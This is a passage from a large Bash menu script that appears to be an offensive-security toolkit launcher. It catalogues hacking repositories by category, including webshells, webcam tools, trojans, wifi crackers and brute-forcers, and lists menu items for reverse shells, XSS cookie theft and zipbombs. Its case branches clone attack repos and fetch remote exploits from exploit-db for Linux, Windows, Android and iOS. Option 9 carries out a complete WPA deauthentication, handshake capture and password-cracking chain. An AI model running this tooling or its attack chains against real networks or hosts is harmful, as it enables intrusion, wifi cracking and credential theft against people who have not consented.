		echo "$SEP"
	fi
	echo "$CGH"" GH. STEGANALYSIS"
	if [[ "$CGH" == "[-]" ]];
	then
		Stampa " 270. Va5c0/Steghide-Brute-Force-Tool/steg_brute" "271. daniellerch/aletheia"
		Stampa " 272. Diefunction/stegbrute" "603. Paradoxis/StegCracker"
		echo "$SEP"
	fi
	echo "$CHP"" HP. SYNOPSYS"
	if [[ "$CHP" == "[-]" ]];
	then
		Stampa " 2648. blackducksoftware/synopsys-detect"
		echo "$SEP"
	fi
	echo "$CGI"" GI. TACACS"
	if [[ "$CGI" == "[-]" ]];
	then
		Stampa " 187. GrrrDog/TacoTaco"
		echo "$SEP"
	fi
	echo "$CHQ"" HQ. TEMP-MAIL"
	if [[ "$CHQ" == "[-]" ]];
	then
		Stampa " 2650. CodeX-ID/Temp-mail"
		echo "$SEP"
	fi
	echo "$CGJ"" GJ. TERMUX"
	if [[ "$CGJ" == "[-]" ]];
	then
		Stampa " 615. install metasploit first method" "622. install metasploit second method" "624. install sudo (no rooting phone)"
		Stampa " 633. TermuxHacking000/distrux" "634. TermuxHacking000/SysO-Termux" "635. TermuxHacking000/PortmapSploit"
		Stampa " 776. cSploit/android" "777. routerkeygen/routerkeygenAndroid" "782. intercepter-ng"
		Stampa " 2234. OnionApps/Chat.onion" "2254. LinkClink/Rainbow-Wifi-Hack-Utility-Android" "2255. trevatk/Wifi-Cracker"
		Stampa " 2256. trevatk/Wifi-Cracker" "2257. faizann24/wifi-bruteforcer-fsecurify" "2258. faizann24/wifi-bruteforcer-fsecurify"
		Stampa " 2412. urbanadventurer/Android-PIN-Bruteforce" "2450. modded-ubuntu/modded-ubuntu"
		echo "$SEP"
	fi
	echo "$CGK"" GK. TFTP"
	if [[ "$CGK" == "[-]" ]];
	then
		Stampa " 719. nullsecuritynet/tftp-fuzz" "1199. RubenRocha/ftpscout"
		echo "$SEP"
	fi
	echo "$CGL"" GL. TLS"
	if [[ "$CGL" == "[-]" ]];
	then
		Stampa " 189. GrrrDog/sni_bruter" "428. tintinweb/striptls" "2265. tlsfuzzer/tlsfuzzer"
		Stampa " 2270. righettod/tls-cert-discovery"
		echo "$SEP"
	fi
	echo "$CGM"" GM. TONES"
	if [[ "$CGM" == "[-]" ]];
	then
		Stampa " 240. luickk/gan-audio-generator" "241. rzbrk/mfv"
		echo "$SEP"
	fi
	echo "$CGN"" GN. TROJANS"
	if [[ "$CGN" == "[-]" ]];
	then
		Stampa " 1404. ChaitanyaHaritash/kimi"
		echo "$SEP"
	fi
	echo "$CGO"" GO. TRUECRYPT"
	if [[ "$CGO" == "[-]" ]];
	then
		Stampa " 321. lvaccaro/truecrack"
		echo "$SEP"
	fi
	echo "$CGP"" GP. TUNNELLING"
	if [[ "$CGP" == "[-]" ]];
	then
		Stampa " 60. yarrick/iodine" "61. T3rry7f/ICMPTunnel/IcmpTunnel_S" "62. blackarrowsec/pivotnacci"
		Stampa " 63. rofl0r/microsocks" "66. cgrates/rpcclient" "143. sysdream/ligolo"
		Stampa " 986. patpadgett/corkscrew" "1010. chokepoint/CryptHook" "1176. BishopFox/firecat"
		Stampa " 1191. stealth/fraud-bridge" "1319. larsbrinkhoff/httptunnel" "1354. takeshixx/ip-https-tools"
		Stampa " 1397. xtaci/kcptun"
		echo "$SEP"
	fi
	echo "$CGQ"" GQ. UPNP"
	if [[ "$CGQ" == "[-]" ]];
	then
		Stampa " 146. tenable/upnp_info" "2264. dhishan/UPnP-Hack" "1128. google.com/miranda-upnp"
		Stampa " 2271. dc414/Upnp-Exploiter"
		echo "$SEP"
	fi
	echo "$CGR"" GR. USB"
	if [[ "$CGR" == "[-]" ]];
	then
		Stampa " 2231. nccgroup/umap2" "2232. usb-tools/ViewSB" "2233. Merimetso-Code/USB-Hacking/usbfind" "2459. hak5darren/USB-Rubber-Ducky"
		echo "$SEP"
	fi
	echo "$CGS"" GS. UTILITIES"
	if [[ "$CGS" == "[-]" ]];
	then
		Stampa " 99. Clone a Repo from GitHub" "100. Enable forlder to HttpServer" "101. listen reverse shell from Windows"
		Stampa " 102. listen reverse shell from Linux" "103. create ssh keys in this folder" "104. Base64 for Windows (utf16)"
		Stampa " 105. Base64 utf8" "110. create simple php shell POST request" "111. Dump file to escaped hex"
		Stampa " 112. print a python reverse shell" "113. print a perl reverse shell" "114. print a ruby reverse shell"
		Stampa " 115. print a bash reverse shell" "116. print a php reverse shell" "243. print a powershell reverse shell"
		Stampa " 165. Mount cifs in folder" "203. Download informations from IMAP email account"
		Stampa " 317. get all DNS info" "324. Bluetooth scanning" "334. Hydra login-attack"
		Stampa " 350. dirbustering with gobuster" "365. Add jpg header to a php revshell"
		Stampa " 366. create simple php shell GET request" "367. create simple php shell with REQUESTS"
		Stampa " 389. packets capture" "416. try to install repository" "417. get email addresses (mx data)"
		Stampa " 429. wipe an external device" "430. wipe a file" "431. shred a file"
		Stampa " 561. get a remote file in base64 encode" "596. download all files inside a folder shared via smb or samba"
		Stampa " 598. get some useful files from remote url or ip" "600. upload a shell with PUT method"
		Stampa " 618. enum users with finger" "628. ssh dictionary remote attack with optional port forwarding"
		Stampa " 638. get all keys set in memcached remotely" "643. get netmask infos" "649. extract tar.gz file"
		Stampa " 652. get docker version from IP" "669. analyze an executable file with strace and ltrace"
		Stampa " 739. install tor from torproject siteweb" "740. install tor via apt-transport-tor"
		Stampa " 744. get mx record from domain with dig" "745. get dns infos with host" "746. get ntp infos with ntpq"
		Stampa " 747. get netbios infos with nmblookup" "749. download all files from IP in ftp with anonymous creds"
		Stampa " 750. username and password dictionary attack with wget and ftp protocol"
		Stampa " 754. get RPC info" "755. get RPC connect" "2423. get aws token and meta-data"
		Stampa " 756. smb connection" "757. rlogin dictionary attack" "758. rdesktop dictionary attack"
		Stampa " 9. wifi WPA with deauth attack" "2251. SSTI RCE" "2252. SSTI jinja2 RevShell"
		Stampa " 76. print all functions of a binary" "135. dump all opcodes from a binary" "2661. AND bitwise a string value"
		Stampa " 2261. Encrypt and Encode a file to pass in remote host" "2267. install a python hacking package"
		Stampa " 2268. install a python3 hacking package" "2289. install a ruby hacking gem" "Prepare RevShell for Windows"
		Stampa " 2337. install a deb package" "2338. install a browser" "2353. Pull a Docker image"
		Stampa " 2452. AWS S3 copy file to remote host" "2453. AWS S3 list file in remote host" "2454. AWS S3 dump dynamodb tables"
		Stampa " 2457. install poetry" "2503. run dbg and disassembling a bin file" "751. RCE with finger"
		Stampa " 2515. Create a Reverse Shell for Android and run a listener"
		Stampa " 2539. Create a Reverse Shell for Windows x86 and run a listener"
		Stampa " 2540. Create a Reverse Shell for Windows x64 and run a listener"
		Stampa " 2542. get ASN and infos of target IP from cymru.com" "2543. create an encrypted and encoded payload with metasploit"
		Stampa " 2547. list all pulled docker images" "2624. download a zipbomb from unforgettable.dk"
		Stampa " 2548. run a docker image" "2549. docker process list" "2552. use nmap to scan ports for vulnerabilities"
		Stampa " 2556. Executione command line to Remote IP with RPC" "2564. display all binsry's headers with objdump"
		Stampa " 2572. Steal Cookie from Panel/Manager/CMS with XSS" "2575. use nmap to scan ports with authentication"
		Stampa " 2576. use nmap to scan ports with broadcast" "2577. use nmap to scan ports with brute" "2578. use nmap to scan ports with default"
		Stampa " 2579. use nmap to scan ports with discovery" "2580. use nmap to scan ports with dos" "2581. use nmap to scan ports with exploit"
		Stampa " 2582. use nmap to scan ports with external" "2583. use nmap to scan ports with fuzzer" "2584. use nmap to scan ports with intrusive"
		Stampa " 2585. use nmap to scan ports with malware" "2586. use nmap to scan ports with safe" "2587. use nmap to scan ports with version"
		Stampa " 2591. read symbols and other infos from binary" "2625. create a zipbomb manually" "2626. use metasploit"
		Stampa " 2633. Try a manual SQLinjectio" "2563. disassemble binary with objdump" "2642. Discover OS from ICMP ttl"
		Stampa " 2643. Crack pdf password with John the Ripper" "2651. Extract a gz compressed file" "2652. run chisel in server mode"
		Stampa " 2653. scan for WORDPRESS dirs" "2654. scan for APACHE and TOMCAT dirs" "2655. scan DIRECTORIES"
		Stampa " 2656. bettercap arp poisoning MITM" "2657. XOR bitwise a string value"
		Stampa " 2658. XOR bitwise an array of chars converted in INT values"
		Stampa " 2662. OR bitwise a string value" "2660. OR bitwise an array of chars converted in INT values"
		echo " 2659. AND bitwise an array of chars converted in INT values"
		echo "$SEP"
	fi
	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
	if [[ "$CGT" == "[-]" ]];
	then
		Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
		Stampa " 2465. litneet64/etherblob-explorer" "1212. KarmaHostage/gethspoit"
		echo "$SEP"
	fi
	echo "$CGU"" GU. VOIP"
	if [[ "$CGU" == "[-]" ]];
	then
		Stampa " 461. haasosaurus/ace-voip" "629. voipmonitor/sniffer" "898. jesusprubio/bluebox-ng"
		echo "$SEP"
	fi
	echo "$CGV"" GV. VPN"
	if [[ "$CGV" == "[-]" ]];
	then
		Stampa " 595. 7Elements/Fortigate" "2262. darrenmartyn/VisualDoor" "1040. galkan/openvpn-brute"
		echo "$SEP"
	fi
	echo "$CGW"" GW. WAF"
	if [[ "$CGW" == "[-]" ]];
	then
		Stampa " 1330. stamparm/identYwaf" "1441. lightbulb-framework/lightbulb-framework"
		echo "$SEP"
	fi
	echo "$CGX"" GX. WALLET"
	if [[ "$CGX" == "[-]" ]];
	then
		Stampa " 914. glv2/bruteforce-wallet"
		echo "$SEP"
	fi
	echo "$CHO"" HO. WHATSAPP"
	if [[ "$CHO" == "[-]" ]];
	then
		Stampa " 2646. TheSpeedX/WhatScraper"
		echo "$SEP"
	fi
	echo "$CGY"" GY. WEBAPP - WEBSITES"
	if [[ "$CGY" == "[-]" ]];
	then
		Stampa " 96. m4ll0k/WPSeku" "97. swisskyrepo/Wordpresscan" "98. RamadhanAmizudin/Wordpress-scanner"
		Stampa " 122. rezasp/joomscan" "123. rastating/joomlavs" "124. RedVirus0/BlackDir-Framework"
		Stampa " 198. wpscanteam/wpscan" "200. 04x/WpscaN/ICgWpScaNNer" "2362. oppsec/Squid"
		Stampa " 201. The404Hacking/wpscan" "202. drego85/JoomlaScan" "287. boku7/LibreHealth-authRCE"
		Stampa " 466. FortyNorthSecurity/EyeWitness" "614. dariusztytko/jwt-key-id-injector"
		Stampa " 621. s0md3v/Arjun" "789. CoolerVoid/0d1n" "2242. poerschke/Uniscan"
		Stampa " 2283. koutto/web-brutator" "1026. thesp0nge/dawnscanner" "2297. xmendez/wfuzz"
		Stampa " 2346. infosecsecurity/Spaghetti" "2363. lirantal/is-website-vulnerable" "1261. gildasio/h2t"
		Stampa " 1145. ChrisTruncer/EyeWitness" "2464. nim-lang/choosenim/vaf" "1186. tismayil/fockcache"
		Stampa " 2483. AvalZ/WAF-A-MoLE" "2589. xchopath/pathprober" "2594. WangYihang/SourceLeakHacker"
		Stampa " 2609. V1n1v131r4/webdiscover" "1311. riramar/hsecscan" "1312. segment-srl/htcap"
		Stampa " 1317. tomnomnom/httprobe" "1318. breenmachine/httpscreenshot" "1368. stasinopoulos/jaidam"
		Stampa " 1393. P0cL4bs/Kadimus" "2615. rivalsec/pathbuster" "1414. takeshixx/laf"
		echo "$SEP"
	fi
	echo "$CGZ"" GZ. WEBDAV"
	if [[ "$CGZ" == "[-]" ]];
	then
		Stampa " 1025. Graph-X/davscan"
		echo "$SEP"
	fi
	echo "$CHA"" HA. WEBCAMS"
	if [[ "$CHA" == "[-]" ]];
	then
		Stampa " 395. JettChenT/scan-for-webcams" "396. entynetproject/entropy" "397. indexnotfound404/spycam"
		Stampa " 471. jimywork/shodanwave" "479. SuperBuker/CamHell" "564. vanhienfs/saycheese"
		Stampa " 2374. techchipnet/CamPhish"
		echo "$SEP"
	fi
	echo "$CHB"" HB. WEBSHELL"
	if [[ "$CHB" == "[-]" ]];
	then
		Stampa " 562. tennc/webshell" "574. epinna/weevely3" "608. jackrendor/cookiedoor"
		Stampa " 2544. EatonChips/wsh" "2599. oldkingcone/slopShell" "1315. wireghoul/htshells"
		echo "$SEP"
	fi
	echo "$CHC"" HC. WEBSOCKET"
	if [[ "$CHC" == "[-]" ]];
	then
		Stampa " 2632. PalindromeLabs/STEWS"
		echo "$SEP"
	fi
	echo "$CHD"" HD. WIFI - WPA2 - WEP - PSK - 802.11"
	if [[ "$CHD" == "[-]" ]];
	then
		Stampa " 540. blunderbuss-wctf/wacker" "550. calebmadrigal/trackerjacker" "580. JPaulMora/Pyrit"
		Stampa " 591. hash3liZer/WiFiBroot" "592. SValkanov/wifivoid" "800. v1s1t0r1sh3r3/airgeddon"
		Stampa " 833. NORMA-Inc/AtEar" "904. M1ND-B3ND3R/BoopSuite" "921. aanarchyy/bully"
		Stampa " 990. joswr1ght/cowpatty" "2263. luc10/zykgen" "2281. 0xd012/wifuzzit"
		Stampa " 1046. elceef/dhcpf" "1047. kamorin/DHCPig" "1048. misje/dhcpoptinj"
		Stampa " 1108. securestate/eapeak" "2336. whid-injector/WHID" "2427. IGRSoft/KisMac2"
		Stampa " 1192. kylemcdonald/FreeWifi" "2502. ankit0183/Wifi-Hacking" "1447. vk496/linset"
		Stampa " 1491. aircrack-ng/mdk4"
		echo "$SEP"
	fi
	echo "$CHE"" HE. WINRM"
	if [[ "$CHE" == "[-]" ]];
	then
		Stampa " 42. Hackplayers/evil-winrm"
		echo "$SEP"
	fi
	echo "$CHF"" HF. WORDLIST"
	if [[ "$CHF" == "[-]" ]];
	then
		Stampa " 51. danielmiessler/SecLists" "53. dariusztytko/words-scraper" "245. LandGrey/pydictor"
		Stampa " 542. digininja/CeWL" "905. R3nt0n/bopscrk" "1103. nil0x42/duplicut"
		Stampa " 302. duyet/bruteforce-database" "318. digininja/pipal" "535. nil0x42/cracking-utils"
		Stampa " 985. assetnote/commonspeak2" "404. OWASP/D4N155" "2300. shamrin/diceware"
		Stampa " 2388. DavidWittman/wpxmlrpcbrute/1000-most-common-passwords"
		Stampa " 2449. google/spraygen" "1467. initstring/lyricpass" "1495. sc0tfree/mentalist"
		Stampa " 2470. scrapmaker/rockyou.txt" "2473. digininja/RSMangler" "2537. D4Vinci/elpscrk"
		echo "$SEP"
	fi
	echo "$CHG"" HG. WORDPRESS"
	if [[ "$CHG" == "[-]" ]];
	then
		Stampa " 468. n00py/WPForce" "469. BlackXploits/WPBrute" "566. 0xAbdullah/0xWPBF"
		Stampa " 655. Moham3dRiahi/WPGrabInfo" "667. ShayanDeveloper/WordPress-Hacker"
		Stampa " 668. Jamalc0m/wphunter" "199. MrCl0wnLab/afdWordpress"
		echo "$SEP"
	fi
	echo "$CHI"" HI. XSS - XPATH"
	if [[ "$CHI" == "[-]" ]];
	then
		Stampa " 55. hahwul/dalfox" "164. s0md3v/XSStrike" "44. lc/gau"
		Stampa " 176. sullo/nikto" "180. faizann24/XssPy" "2371. The404Hacking/XsSCan"
		Stampa " 181. secdec/xssmap" "182. gbrindisi/xsssniper" "183. pwn0sec/PwnXSS"
		Stampa " 184. lwzSoviet/NoXss" "394. Jewel591/xssmap" "558. dwisiswant0/findom-xss"
		Stampa " 620. hahwul/XSpear" "623. r0oth3x49/Xpath" "780. capture0x/XSS-LOADER"
		Stampa " 814. lewangbtcc/anti-XSS" "1069. whitel1st/docem" "1183. riusksk/FlashScanner"
		Stampa " 2475. yehia-mamdouh/XSSYA-V-2.0" "1316. Danladi/HttpPwnly" "1523. koto/mosquito"
		echo "$SEP"
	fi
	echo "$CHJ"" HJ. ZIGBEE"
	if [[ "$CHJ" == "[-]" ]];
	then
		Stampa " 1403. riverloopsec/killerbee"
		echo "$SEP"
	fi
	echo "$CHK"" HK. ZIP"
	if [[ "$CHK" == "[-]" ]];
	then
		Stampa " 43. The404Hacking/ZIP-Password-BruteForcer" "237. mnismt/CompressedCrack"
		Stampa " 2612. Tylous/ZipExec"
		echo "$SEP"
	fi
	echo "$CHL"" HL. PROXY SERVERS (HTTP SOCKS4 SOCKS5)"
	if [[ "$CHL" == "[-]" ]];
	then
		Stampa " 106. clarketm/proxy-list" "107. opsxcq/proxy-list" "108. a2u/free-proxy-list"
		Stampa " 109. cristiangonzales/Amazon-Discounts/proxy-list" "117. TheSpeedX/PROXY-List" "118. labic/ze-the-scraper/proxies-list"
		Stampa " 119. samrocketman/proxylist"
		echo "$SEP"
	fi
	echo "$CHM"" HM. ? - OTHERS"
	if [[ "$CHM" == "[-]" ]];
	then
		Stampa " 36. SigPloiter/HLR-Lookups" "37. i3visio/osrframework" "2354. py2exe/py2exe"
		Stampa " 39. vanhauser-thc/thc-ipv6" "225. idapython/src" "226. erocarrera/pefile"
		Stampa " 325. projectdiscovery/httpx" "796. sshock/AFFLIBv3" "839. MRGEffitas/scripts"
		Stampa " 1000. oblique/create_ap" "1031. byt3bl33d3r/DeathStar" "1034. UltimateHackers/Decodify"
		Stampa " 1091. szechyjs/dsd" "1098. fleetcaptain/dtp-spoof" "1099. insomniacslk/dublin-traceroute"
		Stampa " 1100. kevthehermit/DuckToolkit" "1102. MalcolmRobb/dump1090" "1035. takeshixx/deen"
		Stampa " 2451. google/security-research" "1155. mubix/FakeNetBIOS" "1169. 0blio/fileGPS"
		Stampa " 1171. subinacls/Filibuster" "1188. ALSchwalm/foresight" "1197. miaouPlop/fs"
		Stampa " 1243. osqzss/gps-sdr-sim" "1254. hackerschoice/gsocket" "1259. BishopFox/h2csmuggler"
		Stampa " 1214. jeanphix/Ghost.py" "2471. sec-consult/aggrokatz" "1290. ZerBea/hcxtools"
		Stampa " 1297. sharkdp/hexyl" "1324. vanhauser-thc/thc-hydra" "1378. incogbyte/jsearch"
		Stampa " 1382. nahamsec/JSParser" "1387. telerik/JustDecompileEngine" "1406. klee/klee"
		Stampa " 1415. rflynn/lanmap2" "1422. mmicu/leena" "2630. 9emin1/charlotte"
		Stampa " 1481. trailofbits/manticore" "1516. fox-it/mkYARA" "1554. L-codes/Neo-reGeorg"
		echo "$SEP"
	fi
	echo "$CHN"" HN. PLUGIN"
	if [[ "$CHN" == "[-]" ]];
	then
		Stampa " 1499. hahwul/metasploit-autopwn/db_autopwn"
		echo "$SEP"
	fi
	echo "$SEP"
	echo "GLOBAL VARIABLES"
	Stampa " 2559. Target Username" "2560. Target Password" "2561. Target Domain"
	Stampa " 2557. Target IP" "2558. Target PORT" "2562. wordlist file"
	Stampa " 2573. Your IP" "2574. Your Port" "2634. Target URL"
	echo "$SEP"
	Stampa "Target: ""$TIP"":$TPRT" "Target domain: ""$TDOM" "Target username: ""$TUSRN"
	Stampa "Target password: ""$TPSSW" "Wordlist: ""$WORDLIST" "YOU: ""$MIP"":$MPRT"
	Stampa "Target URL: ""$TURL"
	echo "User-Agent: ""$USERAGENT"
	echo "Cookies: ""$WCOOKIE"
	echo -e "\t""$CCOOKIE\n"
	echo "Anonymization: $ANON"
	echo "$SEP"
	Stampa " 0. exit" "2570. Anonymization"
	echo "$SEP"
	read -p "Choose a script: " SCELTA
	case "$SCELTA" in
	"0")
		QUESTO=""
		CURLANON=""
		ANON=""
		TIP=""
		TPRT=""
		TUSRN=""
		TPSSW=""
		WORDLIST=""
		TDOM=""
		PYPAK=""
		RUPAK=""
		ENTSSL=""
		ENTRAW=""
		ENTLAB=""
		RQRM=""
		COL=0
		ALN=0
		SEP=""
		ALD=""
		AZD=""
		RLS=""
		RLDW=""
		WBE=""
		FMSG=""
		exit 0
	;;
	"1")
		Clona "CasperGN/ActiveDirectoryEnumeration"
	;;
	"2")
		Clona "dirkjanm/ldapdomaindump"
	;;
	"3")
		Clona "ropnop/kerbrute"
	;;
	"4")
		Clona "ropnop/windapsearch"
	;;
	"5")
		Clona "CroweCybersecurity/ad-ldap-enum"
	;;
	"6")
		Clona "proabiral/inception"
	;;
	"7")
		Clona "dark-warlord14/ffufplus"
	;;
	"8")
		Clona "ZecOps/CVE-2020-0796-RCE-POC"
	;;
	"9")
		iwconfig
		echo "Digit a wifi device"
		read -p "(example, wlan0): " WFD
		if [[ "$WFD" != "" ]];
		then
			airmon-ng check kill
			airmon-ng start "$WFD"
			iwconfig
			echo "Digit the wifi device in monitor mode"
			read -p "(example wlan0mon): " WFDM
			if [[ "$WFDM" != "" ]];
			then
				xterm -e airodump-ng "$WFDM" &
				echo "Digit a channel number"
				read -p "(example, 11): " CHN
				if [[ "$CHN" != "" ]];
				then
					xterm -e airodump-ng -c "$CHN" "$WFDM" &
					echo "Digit a target bssid address"
					read -p "(example, 00:11:22:33:44:55): " BSSD
					if [[ "$BSSD" != "" ]];
					then
						xterm -e airodump-ng --bssid "$BSSD" -c "$CHN" "$WFDM" &
						echo "Digit a target station for the deauth attack"
						read -p "(example, 99:88:77:66:55:44): " STN
						if [[ "$STN" != "" ]];
						then
							xterm -e airodump-ng -c "$CHN" -d "$STN" -w capture "$WFDM" &
							sleep 2
							RSP="n"
							echo "Wait the WPA handshake is completed or PMKID is found..."
							while [[ "$RSP" != "Y" ]];
							do
								xterm -e aireplay-ng -a "$BSSD" -c "$STN" --deauth 1 "$WFDM" &
								echo "Is the WPA handshake completed or PMKID found?"
								read -p "(Y/n, default is n): " -i "n" RSP
							done
							airmon-ng stop "$WFDM"
							echo "Digit a password wordlist file"
							read -e -p "(example, /usr/share/wordlists/rockyou.txt): " WORDLIST
							if [[ -f "$WORDLIST" ]];
							then
								aircrack-ng capture-*.cap -w "$WORDLIST"
							fi
						fi
					fi
				fi
			fi
		fi
	;;
	"10")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""linux/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"11")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""linux_x86-64/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux_x86-64/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86-64/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86-64/remote"| grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86-64/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"12")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""linux_x86/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux_x86/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86/remote"| grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"13")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""windows/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"14")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""windows_x86/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"15")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""windows_x86-64/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86-64/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"16")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="sundaysec/Android-Exploits/"
			MEX="master/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/master/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/sundaysec/Android-Exploits/tree/master/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""sundaysec/Android-Exploits/master/remote/$NOMEFL"
			fi
		fi
	;;
	"17")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""android/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""android/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""android/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""android/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""android/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTTO""$NOMEFL"
			fi
		fi
	;;
	"18")
		OFFSEC="offensive-security/exploitdb/"
		MEX="master/exploits/"
		ENTTO="$ENTRAW""$OFFSEC""$MEX""ios/remote/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""ios/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
